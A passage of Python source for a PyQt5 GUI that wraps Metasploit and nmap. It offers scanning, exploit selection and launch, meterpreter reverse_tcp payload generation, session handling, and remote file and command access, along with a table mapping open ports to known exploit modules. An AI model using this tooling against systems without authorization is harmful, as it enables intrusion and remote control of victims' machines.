            <li><b>Scanner</b> - Network scanning with nmap integration</li>
            <li><b>Exploit</b> - Search, select, and run exploits</li>
            <li><b>Payload</b> - Generate payloads with msfvenom</li>
            <li><b>Sessions</b> - Manage active Meterpreter sessions</li>
            <li><b>Post-Exploit</b> - Post-exploitation modules</li>
        </ul>
        
        <h2>Keyboard Shortcuts</h2>
        <ul>
            <li>Ctrl+Q - Quit application</li>
            <li>Ctrl+D - Clear terminal</li>
            <li>F5 - Refresh current view</li>
        </ul>
        
        <h2>Safety Notice</h2>
        <p style="color: #ff4444;">This tool is for authorized penetration testing and educational use only.</p>
        <p>Unauthorized use is illegal and unethical. Always obtain proper permission before testing.</p>
        
        <h2>Support</h2>
        <p>For issues and updates, contact: +92 3490916663</p>
        """)
        layout.addWidget(help_text)
        
        return page
    
    def setup_connections(self):
        """Setup signal connections"""
        self.msf_client.connected.connect(self.on_msf_connected)
        self.msf_client.output_received.connect(self.on_msf_output)
        self.msf_client.session_list_received.connect(self.on_sessions_updated)
    
    def on_msf_connected(self, success: bool, message: str):
        """Handle Metasploit connection status"""
        if success:
            self.msf_status.setText(f"🟢 Metasploit: Connected")
            self.msf_status.setStyleSheet("color: #00ff00;")
            self.status_label.setText("Ready")
            self.log_output("[+] Connected to Metasploit successfully")
        else:
            self.msf_status.setText(f"🔴 Metasploit: {message}")
            self.msf_status.setStyleSheet("color: #ff4444;")
            self.status_label.setText("Connection failed")
            self.log_output(f"[!] Failed to connect: {message}")
    
    def on_msf_output(self, output: str):
        """Handle output from Metasploit"""
        self.log_output(output)
    
    def on_sessions_updated(self, sessions: dict):
        """Update sessions list"""
        self.sessions_list.clear()
        for sid, info in sessions.items():
            item = QListWidgetItem(f"Session {sid}: {info.get('type', 'unknown')} - {info.get('tunnel_peer', '')}")
            item.setData(Qt.UserRole, sid)
            self.sessions_list.addItem(item)
        
        if self.dashboard_sessions_count:
            self.dashboard_sessions_count.setText(str(len(sessions)))
    
    def log_output(self, message: str):
        """Add message to terminal output"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal_dock.append(f"[{timestamp}] {message}")
        # Auto-scroll
        cursor = self.terminal_dock.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.terminal_dock.setTextCursor(cursor)
    
    def show_dashboard(self):
        """Switch to dashboard tab"""
        self.content_stack.setCurrentIndex(0)
    
    def show_scanner(self):
        """Switch to scanner tab"""
        self.content_stack.setCurrentIndex(1)
    
    def show_exploit(self):
        """Switch to exploit tab"""
        self.content_stack.setCurrentIndex(2)
    
    def show_payload(self):
        """Switch to payload tab"""
        self.content_stack.setCurrentIndex(3)
    
    def show_sessions(self):
        """Switch to sessions tab and refresh"""
        self.content_stack.setCurrentIndex(4)
        self.msf_client.list_sessions()
    
    def show_post(self):
        """Switch to post-exploit tab"""
        self.content_stack.setCurrentIndex(5)
    
    def show_help(self):
        """Switch to help tab"""
        self.content_stack.setCurrentIndex(6)
    
    def start_scan(self, scan_type: str):
        """Start nmap scan"""
        target = self.scan_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP or range")
            return
        
        self.scan_output.clear()
        self.log_output(f"[*] Starting {scan_type} scan on {target}")
        
        self.scanner_thread = NmapScanner(target, scan_type)
        self.scanner_thread.scan_output.connect(lambda x: self.scan_output.append(x))
        self.scanner_thread.scan_finished.connect(lambda x: self.log_output(x))
        self.scanner_thread.start()
    
    def filter_exploits(self, text: str):
        """Filter exploit list by search text"""
        for i in range(self.exploit_list.count()):
            item = self.exploit_list.item(i)
            item.setHidden(text.lower() not in item.text().lower())
    
    def refresh_exploits(self):
        """Refresh exploit list from Metasploit"""
        self.log_output("[*] Refreshing exploit list...")
        # In real implementation, we'd query RPC
        self.exploit_list.clear()
        demo = [
            "exploit/windows/smb/ms17_010_eternalblue",
            "exploit/linux/http/apache_mod_cgi_bash_env_exec"
        ]
        for exp in demo:
            self.exploit_list.addItem(exp)
    
    def on_exploit_selected(self, item: QListWidgetItem):
        """Handle exploit selection"""
        self.current_exploit = item.text()
        self.exploit_info.setText(f"Selected: {self.current_exploit}\n\nLoading details...")
    
    def load_exploit(self):
        """Load selected exploit"""
        if not self.current_exploit:
            QMessageBox.warning(self, "Error", "No exploit selected")
            return
        
        self.log_output(f"[*] Loading exploit: {self.current_exploit}")
        self.msf_client.execute_command(f"use {self.current_exploit}")
        self.exploit_info.setText(f"Exploit loaded: {self.current_exploit}\n\nReady to configure options.")
    
    def show_exploit_options(self):
        """Show options for current exploit"""
        if not self.current_exploit:
            QMessageBox.warning(self, "Error", "No exploit selected")
            return
        
        # In real implementation, we'd fetch options via RPC
        options_text = f"""
Options for {self.current_exploit}:

Required:
  RHOSTS: target host(s)
  RPORT: target port (default: 445)
Optional:
  LHOST: local host
  LPORT: local port (default: 4444)
  PAYLOAD: payload to use
        """
        self.exploit_options.setText(options_text)
    
    def run_exploit(self):
        """Run the selected exploit"""
        if not self.current_exploit:
            QMessageBox.warning(self, "Error", "No exploit selected")
            return
        
        # Parse options from text area (simplified)
        options = {}
        text = self.exploit_options.toPlainText()
        lines = text.split('\n')
        for line in lines:
            if ':' in line and 'default:' not in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    if key and value and key != "Options" and key != "Required" and key != "Optional":
                        options[key] = value
        
        self.log_output(f"[*] Running exploit {self.current_exploit} with options: {options}")
        self.msf_client.run_exploit(self.current_exploit, options)
    
    def browse_payload_output(self):
        """Browse for output file location"""
        path, _ = QFileDialog.getSaveFileName(self, "Save Payload As", "", "All Files (*.*)")
        if path:
            self.payload_output_path.setText(path)
    
    def generate_payload(self):
        """Generate payload with msfvenom"""
        payload = self.payload_type.currentText()
        lhost = self.payload_lhost.text().strip()
        lport = self.payload_lport.value()
        output = self.payload_output_path.text().strip()
        
        if not lhost:
            QMessageBox.warning(self, "Error", "Please enter LHOST")
            return
        if not output:
            QMessageBox.warning(self, "Error", "Please select output file")
            return
        
        self.log_output(f"[*] Generating {payload} payload (LHOST={lhost}, LPORT={lport})")
        self.msf_client.generate_payload(payload, lhost, lport, output)
    
    def interact_session(self, item: QListWidgetItem):
        """Interact with selected session"""
        session_id = item.data(Qt.UserRole)
        if session_id:
            self.log_output(f"[*] Interacting with session {session_id}")
            self.msf_client.interact_session(session_id)
    
    def send_session_command(self):
        """Send command to active session"""
        cmd = self.session_command.text().strip()
        if cmd:
            self.log_output(f"[*] Sending command: {cmd}")
            # In real implementation, we'd send to session
            self.session_output.append(f">>> {cmd}\nCommand execution not implemented in demo mode.")
            self.session_command.clear()
    
    def open_shell(self):
        """Open shell on session"""
        current_item = self.sessions_list.currentItem()
        if current_item:
            session_id = current_item.data(Qt.UserRole)
            self.log_output(f"[*] Opening shell on session {session_id}")
            self.session_output.append("[*] Opening shell... (demo mode)")
    
    def kill_session(self):
        """Kill selected session"""
        current_item = self.sessions_list.currentItem()
        if current_item:
            session_id = current_item.data(Qt.UserRole)
            self.log_output(f"[*] Killing session {session_id}")
            # In real implementation, we'd kill session
            row = self.sessions_list.row(current_item)
            self.sessions_list.takeItem(row)
    
    def background_session(self):
        """Background the selected session"""
        current_item = self.sessions_list.currentItem()
        if current_item:
            session_id = current_item.data(Qt.UserRole)
            self.log_output(f"[*] Backgrounding session {session_id}")
            # In real implementation, we'd background session
    
    def get_system_info(self):
        """Get system info from active session"""
        self.log_output("[*] Retrieving system information...")
        self.sysinfo_text.setText("System Information:\n\nHostname: unknown\nOS: unknown\nUser: unknown\n\n(demo mode)")
    
    def browse_remote_files(self):
        """Browse remote filesystem"""
        path = self.file_path.text().strip() or "/"
        self.log_output(f"[*] Browsing {path}")
        self.file_tree.clear()
        # Demo data
        items = ["Documents", "Desktop", "Downloads", "config.ini", "data.db"]
        for name in items:
            QTreeWidgetItem(self.file_tree, [name, "4 KB", "2024-01-01"])
    
    def upload_file(self):
        """Upload file to target"""
        local_file, _ = QFileDialog.getOpenFileName(self, "Select file to upload")
        if local_file:
            self.log_output(f"[*] Uploading {local_file}...")
            # In real implementation, upload via session
    
    def download_file(self):
        """Download file from target"""
        remote_file, ok = QInputDialog.getText(self, "Download File", "Enter remote file path:")
        if ok and remote_file:
            self.log_output(f"[*] Downloading {remote_file}...")
            # In real implementation, download via session
    
    def execute_post_command(self):
        """Execute command on target"""
        cmd = self.post_cmd_input.text().strip()
        if cmd:
            self.log_output(f"[*] Executing: {cmd}")
            self.post_output.append(f">>> {cmd}\nCommand output:\n(demo mode)\n")
            self.post_cmd_input.clear()
    
    def load_settings(self):
        """Load saved settings"""
        self.payload_lhost.setText(self.settings.value("lhost", ""))
        # Load other settings
    
    def save_settings(self):
        """Save current settings"""
        self.settings.setValue("lhost", self.payload_lhost.text())
    
    def closeEvent(self, event):
        """Handle window close event"""
        self.save_settings()
        self.msf_client.stop()
        self.msf_client.wait()
        event.accept()

def main():
    """Main application entry point"""
    app = QApplication(sys.argv)
    app.setApplicationName(APP_NAME)
    app.setApplicationVersion(APP_VERSION)
    
    # Set application icon (if available)
    app.setWindowIcon(QIcon())
    
    # Show splash screen
    splash = SplashScreen()
    splash.show()
    
    # Create main window after splash
    QTimer.singleShot(2500, splash.close)
    QTimer.singleShot(2600, lambda: main_window.show())
    
    main_window = MainWindow()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    print(ASCII_LOGO)
    print(f"{APP_NAME} v{APP_VERSION} - {AUTHOR_TAG}")
    print(SAFETY_NOTICE)
    print("\nChecking dependencies...")
    
    # Check if msfconsole is available
    msf_path = shutil.which("msfconsole")
    if not msf_path:
        print("[!] Warning: msfconsole not found in PATH. Metasploit integration will be limited.")
    
    # Check if nmap is available
    nmap_path = shutil.which("nmap")
    if not nmap_path:
        print("[!] Warning: nmap not found in PATH. Scanner module will not work.")
    
    # Check if msfvenom is available
    msfvenom_path = shutil.which("msfvenom")
    if not msfvenom_path:
        print("[!] Warning: msfvenom not found in PATH. Payload generation will be limited.")
    
    print("\nStarting GUI...")
    main()

class AdvancedTerminal(QTextEdit):
    """Custom terminal widget with command history and auto-completion"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.history = []
        self.history_index = -1
        self.command_prefix = "msf6 > "
        self.setStyleSheet("""
            QTextEdit {
                background-color: #000000;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                border: 1px solid #00ff00;
                border-radius: 3px;
            }
        """)
        self.setAcceptRichText(False)
        self.setLineWrapMode(QTextEdit.NoWrap)
        
    def keyPressEvent(self, event):
        """Handle keyboard events for command history"""
        if event.key() == Qt.Key_Up:
            if self.history_index < len(self.history) - 1:
                self.history_index += 1
                self.set_plain_text(self.history[self.history_index])
            event.accept()
        elif event.key() == Qt.Key_Down:
            if self.history_index > 0:
                self.history_index -= 1
                self.set_plain_text(self.history[self.history_index])
            elif self.history_index == 0:
                self.history_index = -1
                self.clear()
            event.accept()
        elif event.key() == Qt.Key_Return:
            cmd = self.toPlainText().strip()
            if cmd:
                self.history.insert(0, cmd)
                self.history_index = -1
                self.parent().execute_command(cmd)
                self.clear()
            event.accept()
        else:
            super().keyPressEvent(event)


class NotificationPopup(QWidget):
    """Animated notification popup"""
    
    def __init__(self, message: str, parent=None, duration=3000):
        super().__init__(parent)
        self.message = message
        self.duration = duration
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
        self.setAttribute(Qt.WA_TranslucentBackground)
        
        # Create layout
        layout = QHBoxLayout(self)
        layout.setContentsMargins(15, 10, 15, 10)
        
        # Icon label
        icon_label = QLabel("🔔")
        icon_label.setStyleSheet("font-size: 16px;")
        layout.addWidget(icon_label)
        
        # Message label
        msg_label = QLabel(message)
        msg_label.setStyleSheet("color: #00ff00; font-size: 12px;")
        layout.addWidget(msg_label)
        
        # Style
        self.setStyleSheet("""
            QWidget {
                background-color: #1e1e1e;
                border: 1px solid #00ff00;
                border-radius: 8px;
            }
        """)
        
        self.adjustSize()
        
        # Position at bottom right of parent
        if parent:
            parent_geo = parent.geometry()
            self.move(parent_geo.right() - self.width() - 20,
                     parent_geo.bottom() - self.height() - 20)
        
        # Auto-close timer
        QTimer.singleShot(duration, self.close)
        
        # Fade animation
        self.opacity_anim = QPropertyAnimation(self, b"windowOpacity")
        self.opacity_anim.setDuration(300)
        self.opacity_anim.setStartValue(0)
        self.opacity_anim.setEndValue(1)
        self.opacity_anim.start()


class LoadingOverlay(QWidget):
    """Loading overlay with spinner animation"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setStyleSheet("background-color: rgba(0, 0, 0, 180);")
        
        layout = QVBoxLayout(self)
        layout.setAlignment(Qt.AlignCenter)
        
        # Spinner label
        self.spinner = QLabel("◐")
        self.spinner.setFont(QFont("Arial", 48))
        self.spinner.setStyleSheet("color: #00ff00;")
        self.spinner.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.spinner)
        
        # Message label
        self.message_label = QLabel("Processing...")
        self.message_label.setStyleSheet("color: #00ff00; font-size: 14px;")
        self.message_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.message_label)
        
        # Animation timer
        self.spinner_frames = ["◐", "◓", "◑", "◒"]
        self.spinner_index = 0
        self.timer = QTimer()
        self.timer.timeout.connect(self.animate_spinner)
        
    def showEvent(self, event):
        """Start animation when shown"""
        self.timer.start(100)
        super().showEvent(event)
        
    def hideEvent(self, event):
        """Stop animation when hidden"""
        self.timer.stop()
        super().hideEvent(event)
        
    def animate_spinner(self):
        """Animate spinner"""
        self.spinner_index = (self.spinner_index + 1) % len(self.spinner_frames)
        self.spinner.setText(self.spinner_frames[self.spinner_index])
        
    def set_message(self, message: str):
        """Update loading message"""
        self.message_label.setText(message)


class ExploitSuggester:
    """Auto exploit suggestion engine based on scan results"""
    
    def __init__(self):
        self.vulnerability_db = {
            "445": ["exploit/windows/smb/ms17_010_eternalblue",
                   "exploit/windows/smb/ms08_067_netapi"],
            "80": ["exploit/multi/http/struts2_rest_xstream",
                  "exploit/linux/http/apache_mod_cgi_bash_env_exec"],
            "443": ["exploit/multi/http/openssl_heartbleed"],
            "3306": ["exploit/mysql/mysql_authbypass_hashdump"],
            "22": ["exploit/linux/ssh/openssh_username_enum"],
        }
        
    def suggest(self, scan_results: str) -> List[str]:
        """Suggest exploits based on scan results"""
        suggestions = []
        lines = scan_results.lower().split('\n')
        
        for line in lines:
            # Look for open ports
            if "/tcp" in line and "open" in line:
                port = line.split('/')[0].strip()
                if port in self.vulnerability_db:
                    suggestions.extend(self.vulnerability_db[port])
                    
            # Look for service versions
            if "apache" in line:
                suggestions.append("exploit/multi/http/apache_mod_cgi_bash_env_exec")
            if "nginx" in line:
                suggestions.append("exploit/linux/http/nginx_http2_parsing")
                
        return list(set(suggestions))  # Remove duplicates


class MultiTargetManager:
    """Manage multiple targets for scanning and exploitation"""
    
    def __init__(self):
        self.targets = []
        
    def add_target(self, target: str):
        """Add a target to the list"""
        if target not in self.targets:
            self.targets.append(target)
            
    def remove_target(self, target: str):
        """Remove a target from the list"""
        if target in self.targets:
            self.targets.remove(target)
            
    def get_targets(self) -> List[str]:
        """Get all targets"""
        return self.targets.copy()
        
    def clear(self):
        """Clear all targets"""
        self.targets.clear()
        
    def save_to_file(self, filename: str):
        """Save targets to file"""
        with open(filename, 'w') as f:
            for target in self.targets:
                f.write(f"{target}\n")
                
    def load_from_file(self, filename: str):
        """Load targets from file"""
        with open(filename, 'r') as f:
            self.targets = [line.strip() for line in f if line.strip()]



class EnhancedMainWindow(MainWindow):
    """Enhanced main window with additional advanced features"""
    
    def __init__(self):
        self.exploit_suggester = ExploitSuggester()
        self.multi_target_manager = MultiTargetManager()
        self.loading_overlay = None
        
        super().__init__()
        self.setup_shortcuts()
        self.setup_system_tray()
        
    def setup_shortcuts(self):
        """Setup keyboard shortcuts"""
        from PyQt5.QtWidgets import QShortcut
        from PyQt5.QtGui import QKeySequence
        
        # Quit shortcut
        quit_shortcut = QShortcut(QKeySequence("Ctrl+Q"), self)
        quit_shortcut.activated.connect(self.close)
        
        # Clear terminal shortcut
        clear_shortcut = QShortcut(QKeySequence("Ctrl+D"), self)
        clear_shortcut.activated.connect(self.clear_terminal)
        
        # Refresh shortcut
        refresh_shortcut = QShortcut(QKeySequence("F5"), self)
        refresh_shortcut.activated.connect(self.refresh_current_view)
        
        # Save shortcut
        save_shortcut = QShortcut(QKeySequence("Ctrl+S"), self)
        save_shortcut.activated.connect(self.save_configuration)
        
        # Help shortcut
        help_shortcut = QShortcut(QKeySequence("F1"), self)
        help_shortcut.activated.connect(self.show_help)
        
    def setup_system_tray(self):
        """Setup system tray icon and menu"""
        if QSystemTrayIcon.isSystemTrayAvailable():
            self.tray_icon = QSystemTrayIcon(self)
            self.tray_icon.setIcon(QIcon())
            self.tray_icon.setToolTip(APP_NAME)
            
            # Tray menu
            tray_menu = QMenu()
            show_action = QAction("Show", self)
            show_action.triggered.connect(self.show)
            tray_menu.addAction(show_action)
            
            quit_action = QAction("Quit", self)
            quit_action.triggered.connect(self.close)
            tray_menu.addAction(quit_action)
            
            self.tray_icon.setContextMenu(tray_menu)
            self.tray_icon.show()
            
    def clear_terminal(self):
        """Clear terminal output"""
        self.terminal_dock.clear()
        self.show_notification("Terminal cleared")
        
    def refresh_current_view(self):
        """Refresh the current view/tab"""
        current_index = self.content_stack.currentIndex()
        
        if current_index == 0:  # Dashboard
            self.msf_client.list_sessions()
            self.show_notification("Dashboard refreshed")
        elif current_index == 1:  # Scanner
            self.show_notification("Scanner view refreshed")
        elif current_index == 4:  # Sessions
            self.msf_client.list_sessions()
            self.show_notification("Sessions refreshed")
            
    def save_configuration(self):
        """Save current configuration to file"""
        filename, _ = QFileDialog.getSaveFileName(self, "Save Configuration", 
                                                  "markhor_config.json", 
                                                  "JSON Files (*.json)")
        if filename:
            config = {
                "lhost": self.payload_lhost.text(),
                "lport": self.payload_lport.value(),
                "scan_history": self.scan_output.toPlainText(),
                "targets": self.multi_target_manager.get_targets()
            }
            with open(filename, 'w') as f:
                json.dump(config, f, indent=4)
            self.show_notification(f"Configuration saved to {filename}")
            
    def load_configuration(self):
        """Load configuration from file"""
        filename, _ = QFileDialog.getOpenFileName(self, "Load Configuration",
                                                  "", "JSON Files (*.json)")
        if filename:
            with open(filename, 'r') as f:
                config = json.load(f)
            self.payload_lhost.setText(config.get("lhost", ""))
            self.payload_lport.setValue(config.get("lport", 4444))
            self.scan_output.setText(config.get("scan_history", ""))
            for target in config.get("targets", []):
                self.multi_target_manager.add_target(target)
            self.show_notification(f"Configuration loaded from {filename}")
            
    def show_notification(self, message: str, duration=3000):
        """Show a notification popup"""
        self.notification = NotificationPopup(message, self, duration)
        self.notification.show()
        
    def show_loading(self, message: str = "Processing..."):
        """Show loading overlay"""
        if self.loading_overlay is None:
            self.loading_overlay = LoadingOverlay(self)
        self.loading_overlay.set_message(message)
        self.loading_overlay.resize(self.size())
        self.loading_overlay.show()
        
    def hide_loading(self):
        """Hide loading overlay"""
        if self.loading_overlay:
            self.loading_overlay.hide()
            
    def resizeEvent(self, event):
        """Handle resize to update overlay size"""
        if self.loading_overlay and self.loading_overlay.isVisible():
            self.loading_overlay.resize(self.size())
        super().resizeEvent(event)
        
    def create_scanner_page(self) -> QWidget:
        """Enhanced scanner page with multi-target support"""
        page = super().create_scanner_page()
        
        # Add multi-target management
        target_group = QGroupBox("Target Management")
        target_layout = QVBoxLayout()
        
        # Target list
        self.target_list = QListWidget()
        self.target_list.setMaximumHeight(100)
        target_layout.addWidget(self.target_list)
        
        # Target input row
        target_input_layout = QHBoxLayout()
        self.new_target = QLineEdit()
        self.new_target.setPlaceholderText("Add target IP/range...")
        target_input_layout.addWidget(self.new_target)
        
        add_target_btn = QPushButton("+ Add")
        add_target_btn.clicked.connect(self.add_target_to_list)
        target_input_layout.addWidget(add_target_btn)
        
        remove_target_btn = QPushButton("- Remove")
        remove_target_btn.clicked.connect(self.remove_target_from_list)
        target_input_layout.addWidget(remove_target_btn)
        
        target_layout.addLayout(target_input_layout)
        
        # Import/Export buttons
        import_export_layout = QHBoxLayout()
        import_btn = QPushButton("Import Targets")
        import_btn.clicked.connect(self.import_targets)
        import_export_layout.addWidget(import_btn)
        
        export_btn = QPushButton("Export Targets")
        export_btn.clicked.connect(self.export_targets)
        import_export_layout.addWidget(export_btn)
        
        target_layout.addLayout(import_export_layout)
        target_group.setLayout(target_layout)
        
        # Insert at top of page layout
        layout = page.layout()
        layout.insertWidget(0, target_group)
        
        # Add auto-suggestion button
        suggest_btn = QPushButton("💡 Auto-Suggest Exploits")
        suggest_btn.clicked.connect(self.suggest_exploits_from_scan)
        layout.insertWidget(2, suggest_btn)
        
        return page
        
    def add_target_to_list(self):
        """Add target to multi-target list"""
        target = self.new_target.text().strip()
        if target:
            self.multi_target_manager.add_target(target)
            self.target_list.addItem(target)
            self.new_target.clear()
            self.show_notification(f"Added target: {target}")
            
    def remove_target_from_list(self):
        """Remove target from list"""
        current = self.target_list.currentItem()
        if current:
            target = current.text()
            self.multi_target_manager.remove_target(target)
            self.target_list.takeItem(self.target_list.row(current))
            self.show_notification(f"Removed target: {target}")
            
    def import_targets(self):
        """Import targets from file"""
        filename, _ = QFileDialog.getOpenFileName(self, "Import Targets", "", "Text Files (*.txt)")
        if filename:
            self.multi_target_manager.load_from_file(filename)
            self.target_list.clear()
            for target in self.multi_target_manager.get_targets():
                self.target_list.addItem(target)
            self.show_notification(f"Imported {len(self.multi_target_manager.get_targets())} targets")
            
    def export_targets(self):
        """Export targets to file"""
        filename, _ = QFileDialog.getSaveFileName(self, "Export Targets", "targets.txt", "Text Files (*.txt)")
        if filename:
            self.multi_target_manager.save_to_file(filename)
            self.show_notification(f"Exported targets to {filename}")
            
    def start_scan(self, scan_type: str):
        """Enhanced scan with multi-target support"""
        targets = self.multi_target_manager.get_targets()
        
        if not targets:
            # Fall back to single target input
            super().start_scan(scan_type)
            return
            
        self.show_loading(f"Scanning {len(targets)} targets...")
        self.scan_output.clear()
        
        def scan_targets():
            for target in targets:
                self.scan_output.append(f"\n{'='*50}")
                self.scan_output.append(f"Scanning target: {target}")
                self.scan_output.append(f"{'='*50}")
                
                # Run scan for each target
                scanner = NmapScanner(target, scan_type)
                scanner.scan_output.connect(lambda x, t=target: self.scan_output.append(f"[{t}] {x}"))
                scanner.scan_finished.connect(lambda x, t=target: self.scan_output.append(f"[{t}] {x}"))
                scanner.run()
                
            self.hide_loading()
            self.show_notification(f"Completed scanning {len(targets)} targets")
            
        # Run in separate thread
        threading.Thread(target=scan_targets, daemon=True).start()
        
    def suggest_exploits_from_scan(self):
        """Suggest exploits based on latest scan results"""
        scan_text = self.scan_output.toPlainText()
        suggestions = self.exploit_suggester.suggest(scan_text)
        
        if suggestions:
            msg = "Suggested exploits:\n\n" + "\n".join(suggestions)
            QMessageBox.information(self, "Exploit Suggestions", msg)
            self.show_notification(f"Found {len(suggestions)} exploit suggestions")
        else:
            QMessageBox.information(self, "Exploit Suggestions", 
                                   "No specific exploits suggested based on scan results.\nTry running a full scan first.")
                                   
    def create_exploit_page(self) -> QWidget:
        """Enhanced exploit page with categories and favorites"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Search section
        search_layout = QHBoxLayout()
        self.exploit_search = QLineEdit()
        self.exploit_search.setPlaceholderText("Search exploits...")
        self.exploit_search.textChanged.connect(self.filter_exploits)
        search_layout.addWidget(self.exploit_search)
        
        # Category filter
        self.category_filter = QComboBox()
        self.category_filter.addItems(["All", "Windows", "Linux", "Multi", "Web", "Local"])
        self.category_filter.currentTextChanged.connect(self.filter_exploits_by_category)
        search_layout.addWidget(self.category_filter)
        
        self.refresh_exploits_btn = QPushButton("🔄 Refresh")
        self.refresh_exploits_btn.clicked.connect(self.refresh_exploits)
        search_layout.addWidget(self.refresh_exploits_btn)
        
        # Favorites button
        fav_btn = QPushButton("⭐ Favorites")
        fav_btn.clicked.connect(self.show_favorite_exploits)
        search_layout.addWidget(fav_btn)
        
        layout.addLayout(search_layout)
        
        # Splitter for exploit list and options
        splitter = QSplitter(Qt.Horizontal)
        
        # Exploit list with categories
        self.exploit_tree = QTreeWidget()
        self.exploit_tree.setHeaderLabels(["Exploit", "Rank", "Disclosure"])
        self.exploit_tree.itemClicked.connect(self.on_exploit_tree_selected)
        splitter.addWidget(self.exploit_tree)
        
        # Populate with categorized exploits
        self.populate_exploits()
        
        # Options panel (same as before)
        options_panel = QWidget()
        options_layout = QVBoxLayout(options_panel)
        
        self.exploit_info = QTextEdit()
        self.exploit_info.setReadOnly(True)
        self.exploit_info.setMaximumHeight(150)
        options_layout.addWidget(self.exploit_info)
        
        # Options table view (simplified as text edit)
        self.exploit_options = QTextEdit()
        self.exploit_options.setPlaceholderText("Exploit options will appear here...\n\nFormat: option=value (one per line)")
        options_layout.addWidget(self.exploit_options)
        
        # Buttons
        btn_layout = QHBoxLayout()
        self.load_exploit_btn = QPushButton("🔧 Load Exploit")
        self.load_exploit_btn.clicked.connect(self.load_exploit)
        btn_layout.addWidget(self.load_exploit_btn)
        
        self.show_options_btn = QPushButton("📋 Show Options")
        self.show_options_btn.clicked.connect(self.show_exploit_options)
        btn_layout.addWidget(self.show_options_btn)
        
        self.run_exploit_btn = QPushButton("💣 Run Exploit")
        self.run_exploit_btn.clicked.connect(self.run_exploit)
        self.run_exploit_btn.setStyleSheet("background-color: #ff4444; color: #000000;")
        btn_layout.addWidget(self.run_exploit_btn)
        
        options_layout.addLayout(btn_layout)
        splitter.addWidget(options_panel)
        splitter.setSizes([400, 500])
        
        layout.addWidget(splitter)
        
        # Store favorites
        self.favorite_exploits = set()
        
        return page
        
    def populate_exploits(self):
        """Populate exploit tree with categorized exploits"""
        exploits_by_category = {
            "Windows": [
                ("exploit/windows/smb/ms17_010_eternalblue", "great", "2017-03-14"),
                ("exploit/windows/smb/ms08_067_netapi", "great", "2008-10-28"),
                ("exploit/windows/local/ms16_032_secondary_logon_handle_privesc", "excellent", "2016-03-22"),
                ("exploit/windows/http/icecast_header", "good", "2004-09-28"),
            ],
            "Linux": [
                ("exploit/linux/http/apache_mod_cgi_bash_env_exec", "excellent", "2014-09-24"),
                ("exploit/linux/local/overlayfs_priv_esc", "excellent", "2015-06-15"),
                ("exploit/linux/misc/gnutls_hello_overflow", "great", "2014-03-03"),
            ],
            "Multi": [
                ("exploit/multi/http/struts2_rest_xstream", "excellent", "2017-09-05"),
                ("exploit/multi/http/openssl_heartbleed", "great", "2014-04-07"),
                ("exploit/multi/browser/java_rmi_connection_impl", "great", "2011-10-18"),
            ],
            "Web": [
                ("exploit/multi/http/php_cgi_arg_injection", "excellent", "2012-05-03"),
                ("exploit/multi/http/wp_admin_shell_upload", "good", "2013-10-21"),
            ],
            "Local": [
                ("exploit/linux/local/sudo_baron_samedit", "excellent", "2021-01-26"),
                ("exploit/windows/local/ms16_075_reflection", "great", "2016-01-26"),
            ]
        }
        
        for category, exploits in exploits_by_category.items():
            category_item = QTreeWidgetItem(self.exploit_tree, [category, "", ""])
            category_item.setExpanded(True)
            
            for name, rank, date in exploits:
                exploit_item = QTreeWidgetItem(category_item, [name, rank, date])
                exploit_item.setData(0, Qt.UserRole, name)
                
        self.exploit_tree.expandAll()
        
    def filter_exploits_by_category(self, category: str):
        """Filter exploits by category"""
        for i in range(self.exploit_tree.topLevelItemCount()):
            category_item = self.exploit_tree.topLevelItem(i)
            if category == "All" or category_item.text(0) == category:
                category_item.setHidden(False)
                # Show all children
                for j in range(category_item.childCount()):
                    category_item.child(j).setHidden(False)
            else:
                category_item.setHidden(True)
                
    def filter_exploits(self, text: str):
        """Filter exploits by search text"""
        if not text:
            # Show all categories
            self.filter_exploits_by_category(self.category_filter.currentText())
            return
            
        text_lower = text.lower()
        for i in range(self.exploit_tree.topLevelItemCount()):
            category_item = self.exploit_tree.topLevelItem(i)
            has_match = False
            
            for j in range(category_item.childCount()):
                child = category_item.child(j)
                if text_lower in child.text(0).lower():
                    child.setHidden(False)
                    has_match = True
                else:
                    child.setHidden(True)
                    
            category_item.setHidden(not has_match)
            
    def on_exploit_tree_selected(self, item: QTreeWidgetItem, column: int):
        """Handle exploit selection from tree"""
        if item.parent() is not None:  # It's an exploit, not a category
            self.current_exploit = item.text(0)
            self.exploit_info.setText(f"Selected: {self.current_exploit}\nRank: {item.text(1)}\nDisclosure: {item.text(2)}\n\nLoading details...")
            
    def show_favorite_exploits(self):
        """Show only favorite exploits"""
        if not self.favorite_exploits:
            QMessageBox.information(self, "Favorites", "No favorite exploits yet. Double-click an exploit to add to favorites.")
            return
            
        for i in range(self.exploit_tree.topLevelItemCount()):
            category_item = self.exploit_tree.topLevelItem(i)
            has_fav = False
            
            for j in range(category_item.childCount()):
                child = category_item.child(j)
                if child.text(0) in self.favorite_exploits:
                    child.setHidden(False)
                    has_fav = True
                else:
                    child.setHidden(True)
                    
            category_item.setHidden(not has_fav)
            
    def on_exploit_selected(self, item: QListWidgetItem):
        """Override to handle tree selection"""
        # This is handled by on_exploit_tree_selected now
        pass
        
    def create_payload_page(self) -> QWidget:
        """Enhanced payload page with encoding and output formats"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Payload configuration group
        payload_group = QGroupBox("Payload Configuration")
        payload_layout = QGridLayout()
        
        # Payload type
        payload_layout.addWidget(QLabel("Payload Type:"), 0, 0)
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "windows/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp",
